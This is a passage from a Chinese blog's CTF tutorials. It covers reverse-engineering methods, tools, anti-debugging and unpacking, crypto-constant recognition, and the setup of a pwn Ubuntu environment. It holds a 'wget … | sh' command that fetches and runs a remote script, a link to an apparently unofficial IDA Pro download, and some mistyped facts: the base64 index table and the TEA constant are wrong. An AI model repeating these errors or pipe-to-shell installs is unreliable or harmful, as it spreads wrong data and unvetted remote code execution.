逆向分析的主要方法</h4>\n<ul>\n<li>\n<p>静态分析法</p>\n<blockquote>\n<p>静态分析法是在不执行代码文件的情况下，对代码进行静态分析的一种方法，主要观察代码文件的外部特性，包括文件类型分析和静态反汇编、反编译。通常使用反汇编工具查看内部代码，分析代码结构。</p>\n</blockquote>\n</li>\n<li>\n<p>动态分析法</p>\n<blockquote>\n<p>动态分析法是在程序文件的执行过程中对代码进行动态分析的一种方法，其通过调试来分析代码、获取内存的状态等，目的在于定位关键代码后，在程序运行的过程中，借由输出信息（寄存器，内存变化，程序输出）等来验证自己的推断或是理解程序功能。通常使用调试器来分析程序的内部结构和实现原理。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"汇编指令体系结构\"><a class=\"anchor\" href=\"#汇编指令体系结构\">#</a> 汇编指令体系结构</h4>\n<p>逆向分析的程序所使用的处理器架构通常为 Intel 架构，所以需要对 Intel x86 和 x64 指令体系有所了解，包括：</p>\n<ul>\n<li>x86 指令体系下：\n<ul>\n<li>寄存器组</li>\n<li>汇编指令集\n<ul>\n<li>数据传送类指令</li>\n<li>栈操作与函数调用</li>\n<li>算数、逻辑运算指令</li>\n<li>控制转移指令</li>\n<li>特殊指令</li>\n</ul>\n</li>\n<li>x86 应用程序二进制接口</li>\n</ul>\n</li>\n<li>x64 指令体系下与 x86 指令体系相似，这里主要标注<strong>不同点</strong>：\n<ul>\n<li>寄存器组</li>\n<li>系统调用指令</li>\n<li>x64 应用程序二进制接口</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"基本工具-2\"><a class=\"anchor\" href=\"#基本工具-2\">#</a> 基本工具</h4>\n<h5 id=\"反汇编和反编译工具\"><a class=\"anchor\" href=\"#反汇编和反编译工具\">#</a> 反汇编和反编译工具</h5>\n<p>反汇编工具有很多，但最推荐的是<strong> IDA PRO</strong>，在反编译方面，IDA 自带的 Hex-Ray 反编译插件也是最好的。</p>\n<blockquote>\n<p>IDA 的使用比较复杂，需要自己学习。</p>\n</blockquote>\n<blockquote>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMVpOOEtkMlFicG5QNXFtMVFCZnhhSUE=\">https://pan.baidu.com/s/1ZN8Kd2QbpnP5qm1QBfxaIA</span><br />\n 提取码：j2my</p>\n</blockquote>\n<h5 id=\"调试工具\"><a class=\"anchor\" href=\"#调试工具\">#</a> 调试工具</h5>\n<p>调试工具有以下两个重要功能：</p>\n<ol>\n<li>\n<p>断点设置</p>\n<blockquote>\n<p>允许用户选在程序中任意位置的某行代码，一旦程序运行到这一行，将知识调试工具停止运行程序，并显示程序的当前状态。</p>\n</blockquote>\n</li>\n<li>\n<p>代码跟踪（单步调试）</p>\n<blockquote>\n<p>允许用户在程序运行时跟踪他的执行，程序每执行一条汇编代码后都会暂停，允许用户观察甚至改变程序的状态。</p>\n</blockquote>\n</li>\n</ol>\n<p>调试工具主要根据操作系统来选择</p>\n<ul>\n<li>\n<p>Windows——<strong>Ollydbg</strong></p>\n<blockquote>\n<p>Ollydbg 是 Windows 下一款具有可视化界面的用户态调试工具，推荐从吾爱破解论坛上下载吾爱破解专用版 Ollydbg，这个版本有对抗反调试的功能。</p>\n</blockquote>\n</li>\n<li>\n<p>Linux——<strong>GDB</strong></p>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"trace类工具\"><a class=\"anchor\" href=\"#trace类工具\">#</a> Trace 类工具</h4>\n<p>Trace 类工具通过一定的方式监控并记录程序的运行，然后使分析者在记录的信息中得到程序的一些动态信息。</p>\n<ul>\n<li>\n<p>Strace</p>\n<blockquote>\n<p>Strace 使 Linux 下一个用来跟踪系统调用的工具，可以监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>Qira</strong></p>\n<blockquote>\n<p>Qira 是一个强大的 Trace 类工具，可以将程序整个执行流全部记录下来，然后给予用户<strong>回溯</strong>、查看命中断点的所有指令（即交叉引用）等。</p>\n</blockquote>\n<blockquote>\n<p>Qira 的安装比较难，多多百度 / 谷歌。</p>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"常规逆向分析流程\"><a class=\"anchor\" href=\"#常规逆向分析流程\">#</a> 常规逆向分析流程</h4>\n<h5 id=\"1-收集信息\"><a class=\"anchor\" href=\"#1-收集信息\">#</a> 1、收集信息</h5>\n<p>使用 strings/file/binwalk/IDA 等静态分析工具收集信息，并根据这些静态信息进行 google/github 搜索</p>\n<h5 id=\"2-干扰分析技术\"><a class=\"anchor\" href=\"#2-干扰分析技术\">#</a> 2、干扰分析技术</h5>\n<p>程序为了保护代码，通常会使用一系列技术来干扰逆向分析，这里会介绍一些常见的干扰分析技术。</p>\n<ul>\n<li>\n<p>花指令</p>\n<blockquote>\n<p>花指令是代码保护中一种简单的技巧，原理是在原始代码中插入一段无用的或者能够干扰反汇编引擎的代码。花指令主要影响静态分析，在 IDA 中表现为一些指令无法识别，导致某些函数未能识别，从而无法对这些函数进行反编译。</p>\n</blockquote>\n<blockquote>\n<p>要破解花指令，可以在 IDA 中手动将花指令 patch 成 nop 空指令，从而去除花指令。如果程序中花指令较多，可以通过分析花指令的特定模式，编写 IDAPython 脚本对花指令进行自动化搜索和 patch。</p>\n</blockquote>\n</li>\n<li>\n<p>反调试</p>\n<blockquote>\n<p>反调试技术是指程序在运行时会检测其是否处于被调试状态，如果发现其正在被调试，就无法正常运行。</p>\n</blockquote>\n<blockquote>\n<p>Windows 下通过 Ollydbg 的 StringOD 插件可以过滤掉大多数的反调试方法。</p>\n<p>Liunx 下主要利用 ptrace 系统调用、proc 文件系统检测和父进程检测来检测自身是否正在被调试，针对这些反调试方法，常用的方法就是定位到反调试的代码，然后对程序进行 patch，在不影响程序正常功能的情况下，跳过对调试器的检测代码。</p>\n</blockquote>\n</li>\n<li>\n<p>加壳</p>\n<blockquote>\n<p>加壳是指在二进制的程序中植入一段代码。在运行的时候优先取得程序的控制权，这段代码会在执行的过程中对原始指令进行解密还原，之后再将控制权交还给原始代码，执行原来的代码。</p>\n<p>被加过壳的程序，其真正的代码是加密存放在二进制文件中的，只有在执行时才从内存中解密还原出来，因此没法对加了壳的程序直接进行静态分析。</p>\n</blockquote>\n<blockquote>\n<p>在 CTF 比赛中出现的带壳程序通常为已知的壳，大部分都可以通过使用专用工具或者脚本的脱壳。</p>\n<p>可以使用 PEiD 工具查询该带壳程序用的什么壳，再用对应工具或脚本脱壳。</p>\n</blockquote>\n</li>\n<li>\n<p>控制流混淆</p>\n<blockquote>\n<p>对于控制流混淆的程序，没有办法直接进行静态分析，也无法进行反编译，而调试器调试也会陷入控制流的跳转混乱中。</p>\n</blockquote>\n<blockquote>\n<p>对于控制流混淆的程序，通常通过 Trace 工具记录下程序运行的所有指令，然后再运行这些指令的基础上进行数据流分析。</p>\n</blockquote>\n</li>\n<li>\n<p>双进程保护（Debug Blocker）</p>\n<blockquote>\n<p>双进程保护是一种在调试模式下运行自身程序的方法。这种保护通常存在两个进程，由父进程调试子进程。实际功能的代码运行在子进程中，但是因为子进程已经处于调试状态，无法再使用其他调试器进行附加操作。同时父进程能够控制子进程，通过处理子进程的异常，可以控制子进程正常运行。</p>\n<p>双进程保护技术的难点在于，真正的功能运行在子进程中，若要调试子进程，就需要断开其与父进程之间的链接，但是一旦断开，没有父进程处理子进程的异常，会导致子进程无法正常运行。</p>\n</blockquote>\n<blockquote>\n<p>对于双进程保护的程序，其父进程通常功能单一，因此先针对父进程，了解其处理子进程异常的逻辑，然后调试子程序，使其脱离父进程之后仍能正常运行，最后在对子进程进行调试分析。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"3-关键代码定位\"><a class=\"anchor\" href=\"#3-关键代码定位\">#</a> 3、关键代码定位</h5>\n<p>在一个可执行程序中，汇编代码数量庞大，所以要能够定位出真正需要分析的关键代码，只有找到关键代码之后，才能对关键代码采用的算法进行分析，理清程序功能，最后针对程序功能，写出对应脚本，解出 flag。</p>\n<p>这里给出 3 个常用的关键代码定位法</p>\n<ul>\n<li>\n<p>API 断点法</p>\n<blockquote>\n<p>例如：在获取文本输入时，窗口类程序获取文本的方式主要是通过 GetWindowsText 和 GetDlgItemText 两个 API 来获取。在输出结果时，会弹出对话框，这时调用的 API 通常为 MessageBox。在这些 API 函数中下断点，在调试工具中断下来后，通过栈回溯即可定位到关键代码。</p>\n</blockquote>\n</li>\n<li>\n<p>字符串检索法</p>\n<blockquote>\n<ul>\n<li>\n<p>在 IDA 中</p>\n<p>打开 Strings 子窗口，通过 Ctrl+F 输入想要查找的字符串。</p>\n</li>\n<li>\n<p>在 Ollydbg 中</p>\n<p>通过 Alt+E，可以查看可执行模块，找到主模块，点击右键，选择中文搜索引擎，根据需要搜索 ASCII 或者 UNICODE。</p>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>\n<p>辅助工具定位法</p>\n<blockquote>\n<p>针对特定语言或编译器生成的程序，可以用一些辅助工具帮助快速定位案件处理程序的地址。</p>\n<p>如：针对 MFC 程序的 xspy，针对 Delphi 程序的 Dede。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"4-常见加密算法识别\"><a class=\"anchor\" href=\"#4-常见加密算法识别\">#</a> 4、常见加密算法识别</h5>\n<p>在对数据进行变换时，通常会使用一些常用的加密算法，如果能够快速识别出对应的加密算法，就能更快的分析出整个完整的算法，下面给出 CTF 比赛中常用的几种加密算法。</p>\n<ul>\n<li>\n<p><strong>base64</strong></p>\n<blockquote>\n<p>base64 将输入中的每 3 字节（24 比特）按每 6 比特分成一组，编程 4 个小于 64 的索引值，然后通过一个索引表得到 4 个可见字符。</p>\n</blockquote>\n<blockquote>\n<p>索引表为一个 64 字节的字符串：</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>“ABCDEFGHIJKLMNOPQRSTUVMXYZabcdefghijklmnopqrstuvwxyz0123456789<span class=\"token operator\">+</span><span class=\"token operator\">/</span>”</pre></td></tr></table></figure><blockquote>\n<p>如果在代码中发现引用了这个索引表，基本可以确定是 base64。此外，还有一些变种的 base64，主要是改变了索引表。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>TEA</strong></p>\n<blockquote>\n<p>TEA 算法是一种常见的分组加密算法，密钥为 128 比特位，明文为 64 比特位，主要做了 32 轮变换，每轮变换都涉及移位和变换。</p>\n</blockquote>\n<blockquote>\n<p>在 TEA 算法中有一个固定的常数 0x9e3779b9 或者 0x61x88647。</p>\n<p>如果在加密函数中发现了这个常数，基本可以确定是 TEA。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>AES</strong></p>\n<blockquote>\n<p>AES 是一种常见的分组加密算法，加密过程涉及 4 种操作：字节替代、行移位、列混淆、轮密钥加。其中字节替代过程是通过 S 盒完成一个字节到另一个字节的映射。（S 盒的结构自行百度）</p>\n</blockquote>\n<blockquote>\n<p>如果发现程序中有 S 盒或者动态生成了 S 盒，基本可以确定是 AES。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>RC4</strong></p>\n<blockquote>\n<p>RC4 算法属于流加密算法，包括初始化函数和加解密函数。其中初始化代码对某一字符数组进行了初始化赋值，且赋值分别递增，之后又对数组进行了 256 次交换操作。</p>\n</blockquote>\n<blockquote>\n<p>通过识别初始化代码，可以判断是否为 RC4。</p>\n</blockquote>\n</li>\n<li>\n<p><strong>MD5</strong></p>\n<blockquote>\n<p>MD5 信息摘要算法，是一种广泛使用的密码散列函数，会产生一个 128 位（16 字节）的散列值。</p>\n</blockquote>\n<blockquote>\n<p>MD5 加密算法中有个初始化函数 MD5Init ()，会初始化四个 MD5 链接变量的整型参数。分别为 0x67452301、0xefcdab89、0x98badcfe、0x10325476，当看到这四个常数，就可以怀疑是 MD5。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"5-求解flag\"><a class=\"anchor\" href=\"#5-求解flag\">#</a> 5、求解 flag</h5>\n<ul>\n<li>\n<p>直接从内存获取</p>\n<blockquote>\n<p>一些比较简单的题目可以直接查看内存来获取 flag，这种题目只需要在特定的地方下断点，然后查看内存即可获得 flag。</p>\n</blockquote>\n</li>\n<li>\n<p>对算法进行逆变换操作</p>\n<blockquote>\n<p>这类题目要根据程序的输出结果，再分析程序的加密算法，然后编写出对应的逆算法得到 flag。</p>\n</blockquote>\n</li>\n<li>\n<p>线性变换的求解</p>\n<blockquote>\n<p>如果加密算法是一个线性变换，output 的第 i 位只能由 input 的第 i 位决定，通过获取 input [i] 的所有可能输入对应的输出 output [i]，即可求出 input [i]，对于这种变换，可以进行单字符爆破。</p>\n</blockquote>\n</li>\n<li>\n<p>约束求解</p>\n<blockquote>\n<p>如果在 output=convert (input) 之后，需要 output 满足多个约束条件，这种情况下就属于约束求解。</p>\n<p>通常会用到的约束求解器为 z3。</p>\n</blockquote>\n</li>\n</ul>\n<h5 id=\"小结\"><a class=\"anchor\" href=\"#小结\">#</a> 小结</h5>\n<ol>\n<li>使用 strings/file/binwalk/IDA 等静态分析工具收集信息，并根据这些静态信息进行 google/github 搜索。</li>\n<li>研究程序的保护方法，如代码混淆，保护壳及反调试等技术，并设法破除或绕过保护。</li>\n<li>反汇编目标软件，快速定位到关键代码进行分析。</li>\n<li>结合动态调试，验证自己的初期猜想，在分析的过程中理清程序功能。</li>\n<li>针对程序功能，写出对应脚本，求解出 flag。</li>\n</ol>\n<h2 id=\"实战进阶\"><a class=\"anchor\" href=\"#实战进阶\">#</a> 实战 &amp; 进阶</h2>\n<p>一般情况下，大一、大二通过 CTF 比赛学习相应技术，大三开始接触实战。</p>\n<p>根据自己的积累和兴趣，可选取一个方向去深入，例如文件媒体解析类、内核、浏览器内核、IOT、移动端等等。</p>\n<p>下面是一些实战 &amp; 进阶 &amp; 提升的方式</p>\n<ul>\n<li>\n<p>复现漏洞</p>\n</li>\n<li>\n<p>学习漏洞挖掘技术（fuzz)</p>\n</li>\n<li>\n<p>关注顶会议题，尝试寻找攻击面去实践漏洞挖掘</p>\n<ul>\n<li>blcak hat</li>\n<li>poc</li>\n</ul>\n</li>\n<li>\n<p>安全研究漏洞分析</p>\n</li>\n<li>\n<p>甲方</p>\n<ul>\n<li>对内漏洞挖掘</li>\n<li>安全攻防</li>\n</ul>\n</li>\n<li>\n<p>病毒分析</p>\n</li>\n<li>\n<p>纯逆向</p>\n</li>\n<li>\n<p>移动安全、安全加固（移动端)</p>\n</li>\n<li>\n<p>游戏安全</p>\n</li>\n</ul>\n",
            "tags": [
                "pwn",
                "reserve"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2021/12/pwn-environment/",
            "url": "https://www.coldwinds.top/2021/12/pwn-environment/",
            "title": "pwn环境搭建",
            "date_published": "2021-12-11T15:05:05.000Z",
            "content_html": "<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<h3 id=\"虚拟机安装\"><a class=\"anchor\" href=\"#虚拟机安装\">#</a> 虚拟机安装</h3>\n<ol>\n<li>\n<p>安装 VMware Workstation PRO</p>\n</li>\n<li>\n<p>下载 Ubuntu 镜像</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly91YnVudHUuY29tL2Rvd25sb2FkL2Rlc2t0b3A=\">https://ubuntu.com/download/desktop</span></p>\n<p>多个版本，选择 Ubuntu 20.04.3 LTS 即可</p>\n</blockquote>\n</li>\n<li>\n<p>打开 VMware Workstation PRO，选择创建新的虚拟机。</p>\n<blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%851.png\" alt=\"\" /></p>\n<p>选择下载的 Ubuntu 镜像</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%852.png\" alt=\"\" /></p>\n<p>输入用户名和密码（自定）</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%853.png\" alt=\"\" /></p>\n<p>设置虚拟机安装位置（一般在 D 盘新建一个文件夹专门放虚拟机）</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%854.png\" alt=\"\" /></p>\n<p>后面全部性能设置默认就好</p>\n</blockquote>\n</li>\n<li>\n<p>安装完成后，输入之前设置的密码登录，弹窗全部跳过即可。</p>\n</li>\n</ol>\n<h3 id=\"虚拟机配置\"><a class=\"anchor\" href=\"#虚拟机配置\">#</a> 虚拟机配置</h3>\n<h4 id=\"1换源\"><a class=\"anchor\" href=\"#1换源\">#</a> 1. 换源</h4>\n<blockquote>\n<p>因为 Ubuntu 初始源在美国，从国内访问比较慢，所以这里换成清华源（阿里源）</p>\n<ul>\n<li>\n<p>首先备份一下原文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /etc/apt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cp</span> sources.list sources.list.bak</pre></td></tr></table></figure></li>\n<li>\n<p>编辑 sources.list</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit sources.list</pre></td></tr></table></figure></li>\n<li>\n<p>将其中的内容替换为如下内容：(20.04LTS 清华源)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></pre></td></tr></table></figure><p>(20.04LTS 阿里源)</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</pre></td></tr></table></figure></li>\n</ul>\n<p>#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-security main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-security main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-updates main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-updates main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-proposed main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-proposed main restricted universe multiverse<br />\ndeb <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-backports main restricted universe multiverse<br />\n#deb-src <span class=\"exturl\" data-url=\"aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS91YnVudHUv\">http://mirrors.aliyun.com/ubuntu/</span> focal-backports main restricted universe multiverse</p>\n<pre><code>\n* 更新一下源和已安装的软件包\n\n  ```bash\n  sudo apt update\n  sudo apt upgrade\n</code></pre>\n</blockquote>\n<h4 id=\"2必备软件安装\"><a class=\"anchor\" href=\"#2必备软件安装\">#</a> 2. 必备软件安装</h4>\n<h5 id=\"pip3\"><a class=\"anchor\" href=\"#pip3\">#</a> Pip3</h5>\n<blockquote>\n<p>Python 包管理工具，很重要。</p>\n<p>Ubuntu20 默认安装 python3，故安装 pip3。</p>\n<p>安装后 pip/pip3 都可以使用。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> python3-pip</pre></td></tr></table></figure><h5 id=\"git\"><a class=\"anchor\" href=\"#git\">#</a> Git</h5>\n<blockquote>\n<p>git 的功能是拷贝一个 git 仓库到本地，通常用来下载 Github 上的工具。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">git</span></pre></td></tr></table></figure><blockquote>\n<p>Github 有时候连接不上，这里改一下 host。</p>\n<p>在网站 www.ipaddress.com 查找下面两个域名对应的 ip</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>github.global.ssl.fastly.net</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>github.com</pre></td></tr></table></figure><p>然后修改 host 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit /etc/hosts</pre></td></tr></table></figure><p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/githost.png\" alt=\"\" /></p>\n<p>保存后重启虚拟机即可。</p>\n</blockquote>\n<h5 id=\"vim\"><a class=\"anchor\" href=\"#vim\">#</a> Vim</h5>\n<blockquote>\n<p>文本编辑器，功能很强大，具体使用需要自己下去学习。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> <span class=\"token function\">vim</span></pre></td></tr></table></figure><h5 id=\"pwntools\"><a class=\"anchor\" href=\"#pwntools\">#</a> Pwntools</h5>\n<blockquote>\n<p>pwntools 是一个 CTF 框架和漏洞利用开发库，涵盖了 pwn 题利用脚本所需要的各种工具。包括方便的 IO 交互函数，ROP、格式化字符串等利用的自动化工具，shellcode 生成器等等，是目前最好用也是仅有的大型 pwn 利用框架。能节省大量编写脚本的时间。</p>\n<p>极其重要！！！</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3-dev <span class=\"token function\">git</span> libssl-dev libffi-dev build-essential</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> python3 -m pip <span class=\"token function\">install</span> --upgrade pip</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> python3 -m pip <span class=\"token function\">install</span> --upgrade pwntools</pre></td></tr></table></figure><h5 id=\"32位依赖库\"><a class=\"anchor\" href=\"#32位依赖库\">#</a> 32 位依赖库</h5>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> lib32ncurses5-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> lib32z1</pre></td></tr></table></figure><h5 id=\"pwndbgpedagef\"><a class=\"anchor\" href=\"#pwndbgpedagef\">#</a> Pwndbg/Peda/Gef</h5>\n<blockquote>\n<p>GDB 是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中链表的状态，各个地址的内容。GDB 拥有多个插件（peda、pwndbg、gef 等）这些插件提供了一些额外的命令，在可视化和功能上都进行了扩展。</p>\n<p>推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>\n</blockquote>\n<ul>\n<li>Pwndbg</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/pwndbg/pwndbg</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> pwndbg</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>./setup.sh</pre></td></tr></table></figure><ul>\n<li>Peda</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/longld/peda.git~/peda</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"source ~/peda/peda.py\"</span> <span class=\"token operator\">>></span> ~/.gdbinit</pre></td></tr></table></figure><ul>\n<li>Gef</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">wget</span> -q -O-https://github.com/hugsy/gef/raw/master/scripts/gef.sh<span class=\"token operator\">|</span> <span class=\"token function\">sh</span></pre></td></tr></table></figure><blockquote>\n<p>Pwndbg/Peda/Gef 插件可以自由切换，</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> gedit ~/.gdbinit</pre></td></tr></table></figure><p>打开 gdb 环境变量路径文件</p>\n<p>以使用 pwndbg 为例：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> /home/coldwinds/pwndbg/gdbinit.py</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#source ~/peda/peda.py</span></pre></td></tr></table></figure><p>需要使用哪一个插件，在其他插件前面加上 <code>#</code> 注释即可</p>\n</blockquote>\n<h4 id=\"3实用软件安装\"><a class=\"anchor\" href=\"#3实用软件安装\">#</a> 3. 实用软件安装</h4>\n<h5 id=\"rop-garget\"><a class=\"anchor\" href=\"#rop-garget\">#</a> ROP-garget</h5>\n<blockquote>\n<p>用来查找程序中一些指令的地址，64 位程序中运用较多。</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> pip3 <span class=\"token function\">install</span> capstone</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ROPgadget</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> python3 setup.py <span class=\"token function\">install</span></pre></td></tr></table></figure><h5 id=\"one_gadget\"><a class=\"anchor\" href=\"#one_gadget\">#</a> One_gadget</h5>\n<blockquote>\n<p>可以找到 libc 中的 execve ('/bin/sh', NULL, NULL)，在构造其他条件后，利用一个 Gadget 就可以 GetShell。</p>\n</blockquote>\n<figure 